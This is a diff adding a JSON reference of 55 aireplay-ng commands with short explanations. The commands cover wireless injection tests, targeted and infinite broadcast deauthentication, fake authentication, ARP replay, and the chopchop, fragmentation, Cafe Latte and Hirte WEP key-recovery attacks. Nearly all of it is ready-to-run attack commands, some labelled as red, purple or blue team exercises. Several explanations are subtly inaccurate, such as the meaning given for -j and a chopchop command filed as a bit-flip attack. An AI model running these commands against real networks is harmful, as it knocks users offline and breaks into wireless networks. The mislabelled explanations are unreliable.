@@ -1,0 +1,392 @@
+{
+    "tool": "aireplay-ng",
+    "description": "Complete aireplay-ng command and workflow reference from basic to advanced wireless packet injection and attack simulation",
+    "total_commands": 55,
+    "commands": [
+        {
+            "id": 1,
+            "category": "Basic Syntax",
+            "command": "aireplay-ng --help",
+            "example": "aireplay-ng --help",
+            "explanation": "Displays the full help menu listing all available attack modes and command line options"
+        },
+        {
+            "id": 2,
+            "category": "Injection Capability Test",
+            "command": "aireplay-ng -9 wlan0mon",
+            "example": "aireplay-ng -9 wlan0mon",
+            "explanation": "Performs a basic broadcast injection test to verify the card supports packet injection on the current channel"
+        },
+        {
+            "id": 3,
+            "category": "Injection Capability Test",
+            "command": "aireplay-ng -9 -e test_lab_network -a 00:11:22:33:44:55 wlan0mon",
+            "example": "aireplay-ng -9 -e test_lab_network -a 00:11:22:33:44:55 wlan0mon",
+            "explanation": "Tests injection capabilities specifically against a designated Access Point and ESSID to verify reachability"
+        },
+        {
+            "id": 4,
+            "category": "Injection Capability Test",
+            "command": "aireplay-ng -9 -i wlan1 -r wlan0mon",
+            "example": "aireplay-ng -9 -i wlan1 -r wlan0mon",
+            "explanation": "Performs a card-to-card injection test using one interface to attack and another to monitor responses"
+        },
+        {
+            "id": 5,
+            "category": "Deauthentication",
+            "command": "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Sends a single directed deauthentication packet to kick a specific client from an Access Point"
+        },
+        {
+            "id": 6,
+            "category": "Deauthentication",
+            "command": "aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Sends a burst of 5 targeted deauthentication packets to ensure client disconnection for handshake capture"
+        },
+        {
+            "id": 7,
+            "category": "Deauthentication",
+            "command": "aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon",
+            "example": "aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon",
+            "explanation": "Initiates an infinite broadcast deauthentication loop against an Access Point to disconnect all associated clients"
+        },
+        {
+            "id": 8,
+            "category": "Deauthentication",
+            "command": "aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -D wlan0mon",
+            "example": "aireplay-ng -0 10 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF -D wlan0mon",
+            "explanation": "Sends deauthentication packets with the AP detection disabled to force packet transmission regardless of beacon presence"
+        },
+        {
+            "id": 9,
+            "category": "Deauthentication",
+            "command": "aireplay-ng -0 0 -a 00:11:22:33:44:55 --ignore-negative-one wlan0mon",
+            "example": "aireplay-ng -0 0 -a 00:11:22:33:44:55 --ignore-negative-one wlan0mon",
+            "explanation": "Runs a continuous deauthentication attack while suppressing channel mismatch error messages"
+        },
+        {
+            "id": 10,
+            "category": "Fake Authentication",
+            "command": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Performs a standard fake authentication attack to associate a specific MAC address with an Open Access Point"
+        },
+        {
+            "id": 11,
+            "category": "Fake Authentication",
+            "command": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 10 wlan0mon",
+            "example": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 10 wlan0mon",
+            "explanation": "Executes fake authentication with defined keep-alive packets and specific reassociation timing intervals"
+        },
+        {
+            "id": 12,
+            "category": "Fake Authentication",
+            "command": "aireplay-ng -1 6000 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -1 6000 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Performs fake authentication with a long re-authentication delay of 6000 seconds to maintain association quietly"
+        },
+        {
+            "id": 13,
+            "category": "Fake Authentication",
+            "command": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -y shared_key_stream.xor wlan0mon",
+            "example": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -y shared_key_stream.xor wlan0mon",
+            "explanation": "Attempts fake authentication against a WEP Shared Key network using a captured keystream file"
+        },
+        {
+            "id": 14,
+            "category": "Interactive Packet Replay",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Starts interactive mode to select and replay specific packets flowing between an AP and a client"
+        },
+        {
+            "id": 15,
+            "category": "Interactive Packet Replay",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -m 68 -n 86 wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -m 68 -n 86 wlan0mon",
+            "explanation": "Filters and replays only packets matching specific minimum and maximum lengths to target ARP requests"
+        },
+        {
+            "id": 16,
+            "category": "Interactive Packet Replay",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -p 0841 -c FF:FF:FF:FF:FF:FF wlan0mon",
+            "explanation": "Interactively replays packets with a specific Frame Control field (0841) to generate IVs"
+        },
+        {
+            "id": 17,
+            "category": "Interactive Packet Replay",
+            "command": "aireplay-ng -2 -r capture.cap -b 00:11:22:33:44:55 wlan0mon",
+            "example": "aireplay-ng -2 -r capture.cap -b 00:11:22:33:44:55 wlan0mon",
+            "explanation": "Extracts packets from a PCAP file and allows interactive selection for injection into the live network"
+        },
+        {
+            "id": 18,
+            "category": "ARP Request Replay",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Listens for ARP requests and immediately replays them to generate new IVs rapidly"
+        },
+        {
+            "id": 19,
+            "category": "ARP Request Replay",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 500 wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 500 wlan0mon",
+            "explanation": "Executes an ARP replay attack while limiting the injection rate to 500 packets per second"
+        },
+        {
+            "id": 20,
+            "category": "ARP Request Replay",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -j wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -j wlan0mon",
+            "explanation": "Performs ARP replay injection mapping to create a merged capture file (arp-request)"
+        },
+        {
+            "id": 21,
+            "category": "Chopchop Attack",
+            "command": "aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Executes the KoreK Chopchop attack to decrypt a WEP packet byte by byte without knowing the key"
+        },
+        {
+            "id": 22,
+            "category": "Chopchop Attack",
+            "command": "aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -F wlan0mon",
+            "example": "aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -F wlan0mon",
+            "explanation": "Attempts the Chopchop attack but ignores the standard strategy filter to try on any packet"
+        },
+        {
+            "id": 23,
+            "category": "Fragmentation Attack",
+            "command": "aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Launches a Fragmentation attack to obtain a PRGA (Pseudo Random Generation Algorithm) keystream"
+        },
+        {
+            "id": 24,
+            "category": "Fragmentation Attack",
+            "command": "aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.100 wlan0mon",
+            "example": "aireplay-ng -5 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.100 wlan0mon",
+            "explanation": "Performs a Fragmentation attack targeting a specific destination IP to generate a valid keystream"
+        },
+        {
+            "id": 25,
+            "category": "Cafe Latte Attack",
+            "command": "aireplay-ng -6 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -6 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Executes the Cafe Latte attack against a client to recover a WEP key by manipulating ARP requests"
+        },
+        {
+            "id": 26,
+            "category": "Client-Oriented Fragmentation",
+            "command": "aireplay-ng -7 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -7 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Uses the Hirte attack against a client to recover WEP keystreams using fragmentation techniques"
+        },
+        {
+            "id": 27,
+            "category": "WPA Migration Mode",
+            "command": "aireplay-ng -8 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -8 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Attacks WPA migration mode capable Access Points by sending WEP encapsulated broadcast ARP requests"
+        },
+        {
+            "id": 28,
+            "category": "Injection Test",
+            "command": "aireplay-ng -9 -i wlan1 wlan0mon",
+            "example": "aireplay-ng -9 -i wlan1 wlan0mon",
+            "explanation": "Tests injection with a secondary card acting as the sniffer to validate the primary card's injection success"
+        },
+        {
+            "id": 29,
+            "category": "Timing Control",
+            "command": "aireplay-ng -1 60 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -T 1 wlan0mon",
+            "example": "aireplay-ng -1 60 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -T 1 wlan0mon",
+            "explanation": "Performs fake authentication with retry logic set to exit immediately if the fake auth fails"
+        },
+        {
+            "id": 30,
+            "category": "Red Team Simulation",
+            "command": "aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 4 wlan0mon",
+            "example": "aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 4 wlan0mon",
+            "explanation": "Sends deauthentication packets simulating specific reason code 4 (Disassociated due to inactivity) for stealth testing"
+        },
+        {
+            "id": 31,
+            "category": "Purple Team Validation",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 10 wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 10 wlan0mon",
+            "explanation": "Replays ARP requests at a very low rate of 10 pps to test if WIDS threshold alerts are triggered"
+        },
+        {
+            "id": 32,
+            "category": "Blue Team Defense",
+            "command": "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Sends a single deauth frame to validate if the defensive monitoring system logs the exact timestamp and source"
+        },
+        {
+            "id": 33,
+            "category": "Packet Replay",
+            "command": "aireplay-ng -2 -r previous_attack.cap -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 0841 wlan0mon",
+            "example": "aireplay-ng -2 -r previous_attack.cap -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 0841 wlan0mon",
+            "explanation": "Replays specific frame types from a capture file to recreate a specific traffic signature"
+        },
+        {
+            "id": 34,
+            "category": "Custom Packet Building",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -f 1 wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -d FF:FF:FF:FF:FF:FF -f 1 wlan0mon",
+            "explanation": "Interactively replays packets containing the fragmentation bit set"
+        },
+        {
+            "id": 35,
+            "category": "Performance Tuning",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 1024 wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -x 1024 wlan0mon",
+            "explanation": "Stresses the Access Point by replaying ARP requests at the maximum reliable rate of 1024 packets per second"
+        },
+        {
+            "id": 36,
+            "category": "Output Logging",
+            "command": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF 2>&1 | tee fakeauth_log.txt",
+            "example": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF 2>&1 | tee fakeauth_log.txt",
+            "explanation": "Runs a fake authentication attack and pipes the standard output to a log file for audit records"
+        },
+        {
+            "id": 37,
+            "category": "Automation Workflow",
+            "command": "timeout 60s aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon",
+            "example": "timeout 60s aireplay-ng -0 0 -a 00:11:22:33:44:55 wlan0mon",
+            "explanation": "Uses the system timeout command to limit a broadcast deauthentication attack strictly to 60 seconds"
+        },
+        {
+            "id": 38,
+            "category": "Complex Replay",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF -p 0000 wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -c FF:FF:FF:FF:FF:FF -p 0000 wlan0mon",
+            "explanation": "Filters for management frames only (frame control 0000) for interactive replay selection"
+        },
+        {
+            "id": 39,
+            "category": "PRGA Injection",
+            "command": "aireplay-ng -2 -r crafted_packet.cap -y keystream.xor wlan0mon",
+            "example": "aireplay-ng -2 -r crafted_packet.cap -y keystream.xor wlan0mon",
+            "explanation": "Injects a crafted packet from a file by encrypting it on the fly using a known PRGA keystream"
+        },
+        {
+            "id": 40,
+            "category": "WIDS Evasion Test",
+            "command": "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 1 wlan0mon",
+            "example": "aireplay-ng -0 1 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --deauth-rc 1 wlan0mon",
+            "explanation": "Sends deauth packets with reason code 1 (Unspecified failure) to test how WIDS interprets generic disconnects"
+        },
+        {
+            "id": 41,
+            "category": "Advanced Injection",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -d AA:BB:CC:DD:EE:FF -m 100 -n 120 wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -d AA:BB:CC:DD:EE:FF -m 100 -n 120 wlan0mon",
+            "explanation": "Targets packets within a specific size range (100-120 bytes) to identify and replay specific data flows"
+        },
+        {
+            "id": 42,
+            "category": "Deauthentication",
+            "command": "aireplay-ng -0 30 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --ignore-negative-one wlan0mon",
+            "example": "aireplay-ng -0 30 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF --ignore-negative-one wlan0mon",
+            "explanation": "Executes a persistent deauth attack for 30 counts ensuring compatibility across different driver channel reporting"
+        },
+        {
+            "id": 43,
+            "category": "Fake Authentication",
+            "command": "aireplay-ng -1 10 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -Q wlan0mon",
+            "example": "aireplay-ng -1 10 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -Q wlan0mon",
+            "explanation": "Sends re-association requests periodically to a target AP with the 'Q' flag to send reassociation packets"
+        },
+        {
+            "id": 44,
+            "category": "Defensive Stress Test",
+            "command": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 1 wlan0mon",
+            "example": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -o 1 -q 1 wlan0mon",
+            "explanation": "Floods the AP with keep-alive packets every second to test the AP's resource handling and logging"
+        },
+        {
+            "id": 45,
+            "category": "Attack Source Obfuscation",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:55 wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h 00:11:22:33:44:55 wlan0mon",
+            "explanation": "Performs ARP replay spoofing the AP's own MAC address as the source to test switch port security logic"
+        },
+        {
+            "id": 46,
+            "category": "Incident Response Simulation",
+            "command": "aireplay-ng -0 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -0 100 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Simulates a sustained denial of service attack on a VIP client to drill incident response triage procedures"
+        },
+        {
+            "id": 47,
+            "category": "Shared Key Auth",
+            "command": "aireplay-ng -1 0 -e test_lab_network -y keystream.xor -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "example": "aireplay-ng -1 0 -e test_lab_network -y keystream.xor -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF wlan0mon",
+            "explanation": "Uses a known PRGA XOR file to authenticate to a WEP AP protected by Shared Key Authentication"
+        },
+        {
+            "id": 48,
+            "category": "Manual ARP Construction",
+            "command": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -r arp_packet.cap wlan0mon",
+            "example": "aireplay-ng -3 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -r arp_packet.cap wlan0mon",
+            "explanation": "Replays an ARP request extracted specifically from a pcap file rather than listening for a new one"
+        },
+        {
+            "id": 49,
+            "category": "Mass Deauthentication",
+            "command": "aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon",
+            "example": "aireplay-ng -0 5 -a 00:11:22:33:44:55 wlan0mon",
+            "explanation": "Broadcasts 5 deauthentication frames to the entire BSSID, forcing all clients to reconnect simultaneously"
+        },
+        {
+            "id": 50,
+            "category": "Clean Up",
+            "command": "killall aireplay-ng",
+            "example": "killall aireplay-ng",
+            "explanation": "Terminates all running aireplay-ng processes to ensure the wireless interface is released"
+        },
+        {
+            "id": 51,
+            "category": "Client Interaction Check",
+            "command": "aireplay-ng -9 -i wlan0mon wlan0mon",
+            "example": "aireplay-ng -9 -i wlan0mon wlan0mon",
+            "explanation": "Performs a self-test injection check to verify the interface can hear its own injected packets"
+        },
+        {
+            "id": 52,
+            "category": "Fake Auth Picky Mode",
+            "command": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 1 wlan0mon",
+            "example": "aireplay-ng -1 0 -e test_lab_network -a 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -p 1 wlan0mon",
+            "explanation": "Engages fake authentication with packet control set to 1 (picky) to adjust behavior for stubborn APs"
+        },
+        {
+            "id": 53,
+            "category": "Bit-Flip Attack",
+            "command": "aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.55 wlan0mon",
+            "example": "aireplay-ng -4 -b 00:11:22:33:44:55 -h AA:BB:CC:DD:EE:FF -k 192.168.1.55 wlan0mon",
+            "explanation": "Runs the Chopchop attack aiming to guess the keystream for a specific destination IP address"
+        },
+        {
+            "id": 54,
+            "category": "Interactive Frame Selection",
+            "command": "aireplay-ng -2 -b 00:11:22:33:44:55 -t 1 wlan0mon",
+            "example": "aireplay-ng -2 -b 00:11:22:33:44:55 -t 1 wlan0mon",
+            "explanation": "Starts interactive replay but only selects packets with the 'ToDS' bit set to 1"
+        },
+        {
+            "id": 55,
+            "category": "Final Verification",
+            "command": "aireplay-ng -9 -a 00:11:22:33:44:55 -i wlan1 wlan0mon",
+            "example": "aireplay-ng -9 -a 00:11:22:33:44:55 -i wlan1 wlan0mon",
+            "explanation": "Finalizes the workflow with a targeted injection test using a secondary monitor interface for confirmation"
+        }
+    ]
+}
